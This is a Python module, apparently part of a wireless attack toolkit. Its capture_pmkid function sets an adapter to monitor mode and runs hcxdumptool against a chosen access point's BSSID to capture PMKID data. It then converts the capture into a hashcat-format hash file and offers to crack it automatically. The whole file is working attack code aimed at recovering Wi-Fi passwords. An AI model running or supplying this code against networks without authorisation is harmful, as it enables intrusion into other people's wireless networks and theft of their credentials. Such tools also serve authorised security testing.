#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess
import time
import os
from utils.hardware import interface, hardware_available, adapter_detected
from utils.interface import enable_monitor_mode, set_channel
from utils.status import print_status, ProgressDisplay, confirm_action
from utils.process import active_processes, add_process, remove_process, is_cancelled, set_cancel_flag
from utils.logger import log_capture
from utils.config import config
from core.crack import try_auto_crack


def capture_pmkid(bssid: str, channel: str = "1") -> str:
    """Capture PMKID using hcxdumptool."""
    if not hardware_available or not adapter_detected:
        print_status("No USB adapter detected", "error")
        return None

    set_cancel_flag(False)
    print_status(f"PMKID extraction: {bssid}", "info")

    mon_iface = enable_monitor_mode(interface)
    if not mon_iface:
        print_status("Monitor mode failed", "error")
        return None

    if not set_channel(channel):
        return None

    output_file = f"/tmp/pmkid_{os.environ.get('SESSION_ID', 'unknown')}.pcapng"
    timeout = config.get("hardware", {}).get("pmkid_timeout", 60)

    cmd = ["hcxdumptool", "-i", mon_iface, "-o", output_file,
           "--filterlist_ap=" + bssid, "--filtermode=2",
           "-c", str(channel), "-t", str(timeout)]
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    add_process(proc)

    progress = ProgressDisplay()
    progress.start("Capturing PMKID", timeout)

    for i in range(timeout):
        if is_cancelled():
            progress.stop()
            print_status("Capture cancelled", "warning")
            proc.terminate()
            remove_process(proc)
            return None
        time.sleep(1)
        progress.update(i + 1)

    progress.stop()
    proc.terminate()
    proc.wait()
    remove_process(proc)

    hash_file = f"/tmp/pmkid_{os.environ.get('SESSION_ID', 'unknown')}.22000"
    subprocess.run(["hcxpcapngtool", "-o", hash_file, output_file], capture_output=True)

    if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
        log_capture("pmkid", bssid, "", hash_file)
        print_status(f"PMKID captured: {hash_file}", "success")
        if config.get("cracking", {}).get("auto_crack_after_capture", True) and confirm_action("Crack now?"):
            try_auto_crack(hash_file, "pmkid")
        return hash_file
    else:
        print_status("PMKID capture failed", "error")
        return None
